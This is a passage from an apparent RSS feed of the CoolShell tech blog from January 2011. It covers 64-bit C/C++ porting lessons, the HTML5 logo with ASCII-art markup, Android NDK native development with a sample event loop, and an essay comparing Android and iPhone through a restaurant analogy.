<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>2.60</strong> )<br><span class="post-ratings-text" id="ratings_3516_text"></span><meta itemprop="name" content="JS游戏引擎列表">
<meta itemprop="headline" content="JS游戏引擎列表">
<meta itemprop="description" content="这里有一个网址收集了关于JS游戏引擎开发库的一个列表，转过来。关于使用JS和HTML5做的一些小游戏，可参见《HTML5 小游戏展示》
游戏引擎



Name
Latest Release
License
Type
Notes


The Render Engine
1.5.3
MIT

跨浏览器; 大规模 API; 开源. 2


gameQuery
0...">
<meta itemprop="datePublished" content="2011-01-20T10:43:08+08:00">
<meta itemprop="dateModified" content="2011-01-20T15:18:13+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3516.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3516.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="2.6">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3516-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-20T10:43:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/3516.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 64位平台C/C++开发注意事项 ]]></title>
<link>https://coolshell.cn/articles/3512.html</link>
<content><![CDATA[ 
<p>在<a href="http://www.viva64.com/en/l/" target="_blank">http://www.viva64.com/en/l/</a>上例出了28个在64位平台上使用C/C++开发的注意事项，对于进入64位时代的程序员应该去看看这28个事项，这些英文读物对于有C/C++功底的朋友读起来应该并不难，我估计大约20-30分钟可以精读完一篇（或者更快），下面是这28个注意事项的列表。相信对大家一点有帮助。</p>
<ul>
<li>
<a href="http://www.viva64.com/en/l/0001/">Lesson 01</a>. What 64-bit systems are.</li>
<li>
<a href="http://www.viva64.com/en/l/0002/">Lesson 02</a>. Support of 32-bit applications.</li>
<li>
<a href="http://www.viva64.com/en/l/0003/">Lesson 03</a>. Porting code to 64-bit systems. The pros and cons.</li>
<li>
<a href="http://www.viva64.com/en/l/0004/">Lesson 04</a>. Creating the 64-bit configuration.</li>
<li>
<a href="http://www.viva64.com/en/l/0005/">Lesson 05</a>. Building a 64-bit application.</li>
<li>
<a href="http://www.viva64.com/en/l/0006/">Lesson 06</a>. Errors in 64-bit code.</li>
<li>
<a href="http://www.viva64.com/en/l/0007/">Lesson 07</a>. The issues of detecting 64-bit errors.</li>
<li>
<a href="http://www.viva64.com/en/l/0008/">Lesson 08</a>. Static analysis for detecting 64-bit errors.</li>
<li>
<a href="http://www.viva64.com/en/l/0009/">Lesson 09</a>. Pattern 01. Magic numbers.</li>
<li>
<a href="http://www.viva64.com/en/l/0010/">Lesson 10</a>. Pattern 02. Functions with variable number of arguments.</li>
<li>
<a href="http://www.viva64.com/en/l/0011/">Lesson 11</a>. Pattern 03. Shift operations.</li>
<li>
<a href="http://www.viva64.com/en/l/0012/">Lesson 12</a>. Pattern 04. Virtual functions.</li>
<li>
<a href="http://www.viva64.com/en/l/0013/">Lesson 13</a>. Pattern 05. Address arithmetic.</li>
<li>
<a href="http://www.viva64.com/en/l/0014/">Lesson 14</a>. Pattern 06. Changing an array’s type.</li>
<li>
<a href="http://www.viva64.com/en/l/0015/">Lesson 15</a>. Pattern 07. Pointer packing.</li>
<li>
<a href="http://www.viva64.com/en/l/0016/">Lesson 16</a>. Pattern 08. Memsize-types in unions.</li>
<li>
<a href="http://www.viva64.com/en/l/0017/">Lesson 17</a>. Pattern 09. Mixed arithmetic.</li>
<li>
<a href="http://www.viva64.com/en/l/0018/">Lesson 18</a>. Pattern 10. Storage of integer values in double.</li>
<li>
<a href="http://www.viva64.com/en/l/0019/">Lesson 19</a>. Pattern 11. Serialization and data interchange.</li>
<li>
<a href="http://www.viva64.com/en/l/0020/">Lesson 20</a>. Pattern 12. Exceptions.</li>
<li>
<a href="http://www.viva64.com/en/l/0021/">Lesson 21</a>. Pattern 13. Data alignment.</li>
<li>
<a href="http://www.viva64.com/en/l/0022/">Lesson 22</a>. Pattern 14. Overloaded functions.</li>
<li>
<a href="http://www.viva64.com/en/l/0023/">Lesson 23</a>. Pattern 15. Growth of structures’ sizes.</li>
<li>
<a href="http://www.viva64.com/en/l/0024/">Lesson 24</a>. Phantom errors.</li>
<li>
<a href="http://www.viva64.com/en/l/0025/">Lesson 25</a>. Working with patterns of 64-bit errors in practice.</li>
<li>
<a href="http://www.viva64.com/en/l/0026/">Lesson 26</a>. Optimization of 64-bit programs.</li>
<li>
<a href="http://www.viva64.com/en/l/0027/">Lesson 27</a>. Peculiarities of creating installers for a 64-bit environment.</li>
<li>
<a href="http://www.viva64.com/en/l/0028/">Lesson 28</a>. Estimating the cost of 64-bit migration of C/C++ applications.</li>
</ul>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3512" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="fda3e64059">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>4.27</strong> )<br><span class="post-ratings-text" id="ratings_3512_text"></span><meta itemprop="name" content="64位平台C/C++开发注意事项">
<meta itemprop="headline" content="64位平台C/C++开发注意事项">
<meta itemprop="description" content="在http://www.viva64.com/en/l/上例出了28个在64位平台上使用C/C++开发的注意事项，对于进入64位时代的程序员应该去看看这28个事项，这些英文读物对于有C/C++功底的朋友读起来应该并不难，我估计大约20-30分钟可以精读完一篇（或者更快），下面是这28个注意事项的列表。相信对大家一点有帮助。

	Lesson 01. What 64-bit systems ar...">
<meta itemprop="datePublished" content="2011-01-21T08:50:49+08:00">
<meta itemprop="dateModified" content="2011-01-16T23:30:35+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3512.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3512.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.27">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3512-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-21T08:50:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/3512.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ HTML5 logo 发布 ]]></title>
<link>https://coolshell.cn/articles/3561.html</link>
<content><![CDATA[ 
<p style="text-align: left;">2011年1月19日，W3C发布了HTML5的log，打开<a href="https://www.w3.org/html/logo/" target="_blank">W3C的页面</a>，下在的图片印入眼前。我的第一感觉，就像是看到了小时候看的八一电影制片产的电影。这分明是号召全世界的无产Web程序员们团结起来，不畏艰难，不怕牺牲，一定要把HTML5的革命事业进行到底！<img alt="image placeholder" ></p>
<p style="text-align: left;">所以，请各位Web程序员不但在你们的HTML5的网页上加上下面的徽章（关于各个徽章的含义，请参看<a href="http://www.elviscai.com/view/html5-logo-released/" target="_blank">这里</a>）</p>
<p style="text-align: left;"><span id="more-3561"></span></p>
<p style="text-align: center;"><a title="W3C HTML5 Logo" href="https://www.w3.org/html/logo/" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">更重要的是，在你们的代码里加上这样的注释：</p>
<p style="text-align: left;">
</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;!--
.... This website is built in HTML5 ....
...       ..... ......... ....... ......
..     MM  MM NMMMMM MMM MMM..MM  . ....
.      MMMMMM...MM ..MMMMMMM..MM. ......
.      MM77MM...MM . MM.M.MM..MM........
.      MM  MM   MM   MM.  MM..MMMMM.....
.             . .   ....................
. . ================================....
.   7777777777777777777777777777777+....
.   7777777777777777IIIIIIIIIIII777.....
.   7777777777777777I77777I7I777777.....
.   7777777777777777I777I7I7I777777.....
. ..777777,,,,,,,,,,.........,7I777.....
. ..=77777,,,,,,,,,,..   .. .+II777...
  ...77777,,,,777777777777777II7777.....
  . .77777,,,,777777IIIIIIIIIIII77? ..
  ...77777,,,,777777IIIIIIIIIIII77:.....
  ...77777:,,,,,,,,,        .I7777.
  ...77777?,,,,,,,,,... ... .II777. ...
  .. 777777777777777IIII=   .II777.  .
  .. I77777777777777IIII....~II777.. .
  ...,77777,,,,77777IIII    III77$   .
. ....77777,,,,77777IIII    III777
. ....77777,,,,,,,,,... ... III77,. ...
. ....77777,,,,,,,,,       .III77.
  ..  7777777777,,,,...=7IIIII777.. ....
  ....$7777777777777IIIIIIIIII777    .
  ....I7777777777777IIIII7I777777.. ....
  .... .7777777777777777777777$~... ....
  ...     ...~$777777777$7. ....... ....
  ...  .  .........+....................
  ...     ............ .  . .. .  . .. .
--&gt;
</pre>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12206.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_title">HTML6 展望</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5576.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_title">那些曾伴我走过编程之路的软件</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3561" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="deb4e24ec7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>2.60</strong> )<br><span class="post-ratings-text" id="ratings_3561_text"></span><meta itemprop="name" content="HTML5 logo 发布">
<meta itemprop="headline" content="HTML5 logo 发布">
<meta itemprop="description" content="2011年1月19日，W3C发布了HTML5的log，打开W3C的页面，下在的图片印入眼前。我的第一感觉，就像是看到了小时候看的八一电影制片产的电影。这分明是号召全世界的无产Web程序员们团结起来，不畏艰难，不怕牺牲，一定要把HTML5的革命事业进行到底！
所以，请各位Web程序员不但在你们的HTML5的网页上加上下面的徽章（关于各个徽章的含义，请参看这里）


更重要的是，在你们的代码里...">
<meta itemprop="datePublished" content="2011-01-23T08:47:19+08:00">
<meta itemprop="dateModified" content="2011-01-23T16:55:35+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3561.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3561.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="2.6">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3561-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-23T08:47:19+08:00</pubDate>
<guid>https://coolshell.cn/articles/3561.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Android将允许纯C/C++开发应用 ]]></title>
<link>https://coolshell.cn/articles/3549.html</link>
<content><![CDATA[ 
<p>对于Android，长期以来，我一直有两件事搞不懂，</p>
<ul>
<li>一个是为什么Android要选用Java。对于嵌入式开发，CPU和内存都很宝贵，居然还使用Java。</li>
<li>一个是为什么Android的<a href="https://developer.android.com" target="_blank">开发站点</a>要被墙。这只是一个技术网站啊。</li>
</ul>
<p>最近，在一个Android<a href="https://android-developers.blogspot.com/2011/01/gingerbread-ndk-awesomeness.html" target="_blank">开发人员的Blog</a>上证实了在NDK r5使用C/C++进行开发。（以前，Android 对C/C++开发的支持仅限于用C/C++开发动态链接库，然后在Java中以JNI的形式来调用）现在，你可以用纯C/C++开发了（参看下面的程序代码）。还有一段<a href="https://developer.android.com/reference/android/app/NativeActivity.html" target="_blank">完整的代码示例在这里</a>（墙，还有XML的manifest，<a href="https://coolshell.cn/articles/3498.html" target="_blank">又见XML</a>）。看来，Google终于明白为什么使用Android的手机（如：Moto, 三星、索爱和HTC）的触摸体验远远不及object C搞出来的iPhone。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void android_main(struct android_app* state) {
    // Make sure glue isn't stripped.
    app_dummy();

    // loop waiting for stuff to do.
    while (1) {
        // Read all pending events.
        int ident;
        int events;
        struct android_poll_source* source;

        // Read events and draw a frame of animation.
        if ((ident = ALooper_pollAll(0, NULL, &amp;events,
                (void**)&amp;source)) &gt;= 0) {
            // Process this event.
            if (source != NULL) {
                source-&gt;process(state, source);
            }
        }
        // draw a frame of animation
        bringTheAwesome();
    }
}</pre>
<p>我个人估计有两个原因为什么Google回头支持C/C++了，</p>
<ol>
<li>Google开始觉得自己整的JVM在性能上可以全面超越传统JVM，并接近C/C++，现在发现搞不定了。</li>
<li>Google发现Java的程序员不像C/C++程序员那样注重程序的性能和效率，开发App太耗CPU和内存。</li>
</ol>
<p>于是只好转回支持C/C++。<strong>本来就是用C/C++写出来的Android嘛，居然不能用C/C++而只能用Java，真是太侮辱C/C++了</strong>。最后，只希望Google并不是又整了一个C/C++版的Dalvik虚拟机，不然就真是侮辱到极点了。</p>
<p><em><span style="color: #800000;">——— 更新 2011/01/24 ————</span></em></p>
<p>谢谢大家对这篇文章的评论，挺有意思的，欢迎讨论，我把我的回复更新在下面。不一定对，仅供大家参考。</p>
<p><span id="more-3549"></span></p>
<p>Java的学习成本低，开放性好，兼容性也高，我不否认（但请大家也别否认C/C++的效率要比Java要高。而C/C++的程序员在普遍上要比Java程序员更注意性能和效率）。这应该是Andorid的一开始的定位，可见，Google关注的是程序员，而不是用户。现在转回支持C/C++必然有他的原因，如果不是性能上的原因。那么就请大家分析一下别的原因。</p>
<p>Android本来就是用C/C++写的，要跨平台，首先是Android自己跨平台。就像Linux一样，跨平台的首先是Linux，应用开发人员只需要符合Linux的API就OK了。JVM带来的便利只是无需重新编译（就算是无需重新编译，对于开发人员来说也要去那个平台做测试的，因为不同的平台的JVM同样是不一样的）。在Native平台上编译的成本其实并不高，这个编译过程完全可以在部署的时候自动化。</p>
<p>有人说，Java的开发成本比C/C++低，但这和语言没有关系，这其实和封装程度有关系。C/C++同样可以封装得很好。而且，C/C++的程序员比JAVA程序来说，天生就对内存和性能要敏感的多。这更有利于在手机这样资源不足的平台上做开发。</p>
<p>尤其对于像手机这样的时尚终端来说，在用户体验上花的成本要比在开发人员上花成本要大得多的多。我以为，Google 的Android 更多的关注了程序员，而不是用户。而iPhone更多的关注了用户，也让程序员在开发过程上受到了一些牺牲（iPhone的做法是如果程序员的程序要上App Store，先交99美刀的代码审查费，就像申请美国签证一样），但是，iPhone的程序员虽然在开发的方便上有一些牺牲，但是从收入上却得到了保障。最新的消息是苹果已向开发者支付20亿美元 音乐供应商分成达120亿美元。在《<a href="https://coolshell.cn/articles/3363.html" target="_blank">偷了世界的程序员</a>》中对此有充分的论述。</p>
<p><span style="color: #800000;">最后，请大家思考 几个问题——</span></p>
<ul>
<li><span style="color: #800000;">Android支持C/C++是为什么？如果是为了程序效率，那么这又是为什么？</span></li>
<li><span style="color: #800000;">是开发人员更重要，还是用户更重要？（注意：我说的是“更重要”）</span></li>
<li><span style="color: #800000;">在当今这种诸如iPhone或Andorid的开发模式下，是完全开放好，还是有适当的封闭好？</span></li>
<li><span style="color: #800000;">开发和封闭的背后的商业驱动是什么？如何在开放和封闭中权衡用户、开发者、公司和版权商的利益？</span></li>
</ul>
<p>苹果公司给出了一个很不错的商业模式。</p>
<p>（完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3806.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3806.html" class="wp_rp_title">Google图片搜索下的的C String</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2608.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2608.html" class="wp_rp_title">Google App Inventor </a>
</li>
<li>
<a href="https://coolshell.cn/articles/1152.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1152.html" class="wp_rp_title">关于 Chrome OS 的一些推论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3549" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="1fc9361463">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>36</strong> 人打了分，平均分： <strong>4.58</strong> )<br><span class="post-ratings-text" id="ratings_3549_text"></span><meta itemprop="name" content="Android将允许纯C/C++开发应用">
<meta itemprop="headline" content="Android将允许纯C/C++开发应用">
<meta itemprop="description" content="对于Android，长期以来，我一直有两件事搞不懂，

	一个是为什么Android要选用Java。对于嵌入式开发，CPU和内存都很宝贵，居然还使用Java。
	一个是为什么Android的开发站点要被墙。这只是一个技术网站啊。

最近，在一个Android开发人员的Blog上证实了在NDK r5使用C/C++进行开发。（以前，Android 对C/C++开发的支持仅限于用C/C++开发...">
<meta itemprop="datePublished" content="2011-01-24T08:39:50+08:00">
<meta itemprop="dateModified" content="2011-01-24T11:53:52+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3549.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3549.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.58">
<meta itemprop="ratingCount" content="36">
</div>
</div>
<div id="post-ratings-3549-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-24T08:39:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/3549.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 食客还是大厨 ]]></title>
<link>https://coolshell.cn/articles/3589.html</link>
<content><![CDATA[ 
<p><strong><strong>（请勿将本文用于商业用途，转载时注明作者和出处）</strong></strong></p>
<p>昨天我在文章《<a title="Android将允许纯C/C++开发应用" href="https://coolshell.cn/articles/3549.html" target="_blank">Android将允许纯C/C++开发应用</a>》中发表了一些“很不中听”的观点，在我早晨上班刚打开电脑的时候，Gtalk上同学就发来了一条信息“<span style="color: #800080;">android 为啥不用C/C++的原因是，android是开放式系统，为了能够跨平台。如果整回C/C++，那么windows mobile就是前车之鉴。</span>”，于是和同学展了争论，同学的意思是Java是正确的，在硬件上的表现也将是很出色的，而且准入门槛低，最重要的是跨平台，跨平台是恶梦，而硬件上性能的问题在未来不是问题。iPhone是单一平台，所以不需要考虑跨平台。</p>
<p>而在我的博文后面上也有许多的讨论，<a href="http://sd.csdn.net/a/20110124/290717.html" target="_blank">在CSDN上</a>也有一些，大家可以去看看。<strong>很多朋友都谈了谈为什么Java要比C++要好的理由，很多很多，大家可以去看看，我觉得挺好的</strong>。不过后来，我更新了一下我的文章，留下了几个让大家思考的问题，我希望大家都看看。</p>
<p>在这里，我想和大家说说技术之上的东西。</p>
<p>——————————————正文分割线——————————————</p>
<p>在绝大多数的评论中，我看到了大家都是站在技术开发者的角度在讨论。我想这和Google的Android犯的是同一个毛病，那就是其注重了“程序员”，而不是“用户”。就像是，Unix是为程序员开发，Java 也是为程序员的跨平台难问题开发，而Windows是为用户开发，iPhone也是为用户开发。也许，我们认为，改进了程序员的开发体验后，能迸发出程序员强大的生产力，进而增加满足用户需求的能力。不过，我想说的是，<strong>这件事的初衷是好的，但事实上程序员是永远不懂用户的</strong>。</p>
<p><span id="more-3589"></span></p>
<p>就像大家在讨论Android和Java的关系时，仅在谈跨平台，其实，跨平台关我最终用户屁事，开不开放并我最终用户P事。甚至，手机里装的是Linux还是Android还是Win Phone7还是Symbian，我做为一个用户我统统不关心，什么Java，还是C++，管我球事。作为一个程序员，如果你想不通这个观点的话，那你就去想想，你上饭馆点菜时，你会关心你点的菜是用什么样的锅碗瓢盆来盛，用什么样的燃料来做，什么样的刀来切，长在什么样的地，浇了什么样的肥……如果你还想不通的话，请看下面的例子：</p>
<p>有一天，Google告诉所有的大厨，从我们发布Android开始，你们做菜就简单了，这是一个跨平台的烧菜系统，以后，作为厨师的你，做菜再也不用关心是用炒锅，蒸锅，煮锅，砂锅，电饭锅，平底锅，也不用关心做的是西餐还是中餐，我们推出的“虚拟锅”将屏蔽这些硬件和技术细节，以后，你面对的只有一口锅。当然，对于这个虚拟锅，你需要使用一种新型的叫Java锅勺。Java锅勺是强大的，容易的。（然而，过了几年后，他们却推出了传统锅勺）对此，一堆大厨，吵啊吵啊的，大家都在争论锅的好坏。</p>
<p>来饭馆吃饭的食客说，关我屁事，都麻利儿地赶快给我上菜！给我好吃的！（<span style="color: #808080;">到这里，我希望你看懂了，如果你没有看懂的话，就此打住，后面的对你就太深了</span>）</p>
<p>当然，用户并不单单只是着迷于好吃的，还有好的服务和体验！程序员们管这个叫用户体验。不过，如果餐馆都关注大厨们做菜的体验了，很有可能会怠慢了用户体验。餐馆负责人吆喝着，我们的餐馆是跨平台的，是开放的，就是说，任何都可以在我们这里做吃的买给你。食客们说，什么？什么人都可以在你的餐馆里做菜？你搞错没有啊？！餐馆负责人说，这样我们可以吸引到更好的更优秀的大厨，能做出更优秀的菜，有的菜品还是其它餐馆提供的。食客们说，那可以试试。然后，当食客上桌的时候，他们发现不同的菜居然有不同的服务，而且点菜的流程也不一样，不过大家都号称自己有最好的用户体验和服务。此时，食客们反而犹豫了。而各位大厨在厨房津津乐道着自己的做菜体验，而没有挣到一分钱。餐馆负责人还继续向食们说：我们有四个订餐电话，不同的订餐电话可以订到不同的菜，以后这样的订餐电话会更多。</p>
<p>这个时候，一家叫iPhone的餐馆出现了，用户体验非常好，服务也很到位，食客们从入座点菜和进餐的过程都非常的流畅和风格统一，都相当的简单。食客们说，你们的这些菜品是怎么来的？iPhone餐厅负责人说，我们厨房对大厨们其实也是开放的，不过，厨房里的硬件和烹饪器具都是固定而不能修改的，而且，他们要想在这里做菜的话，每年得交给我们99美元的审核费用，我们严格他们的做菜工序，并保证用户的体验一致，我们的收入会和这些厨师分成，特别是那些有秘方的厨师将会分得更多。我们就像麦当劳一样，加盟我们的人有很多，不过我们所有店面的风格和用户点餐的过程完全一致，方便而服务优质。当然，我们的收费是高一点，但在我们这里不会出现任何的混乱。对于食客来说，虽然有人抱怨iPhone餐馆的只有一个服务生（单进程），但是，食客对该餐馆的服务表示很放心，体验也没得说，流畅完美简单一致。</p>
<p><em><span style="color: #800000;"><strong>—–更新：2011/01/26—–</strong></span></em></p>
<p>跨不跨平台，开不开放，一点都不关用户的事，那是程序员的事。但用户的体验很关用户的事。<strong>用户的体验包括两方面，一方面是技术所带来的功能体验，另一方面是服务体验</strong>。Android和iPhone的差别是，Android只关注开发人员的体验和功能的体验，并没有服务的体验，而iPhone把功能和服务的体验都打包了。Android选择走什么样的路无所谓，要打赢这场战争，Android一定要学会从技术向服务的过渡，否则，就开发而言，也就是吸引一下程序员和产商罢了，其对用户没有任何吸引力。</p>
<p>但凡是走这条的，都很有问题（用户和服务跟不上，全部玩完，Linux的前期基本如此）</p>
<ul>
<li>
<strong>产品 -&gt; 开发人员 -&gt; 产商 -&gt; 用户 -&gt; 服务</strong>（???）</li>
</ul>
<p>而有些公司选择了这条路 （产品和服务先行，抢占用户市场相当快，比如Windows，IBM）</p>
<ul>
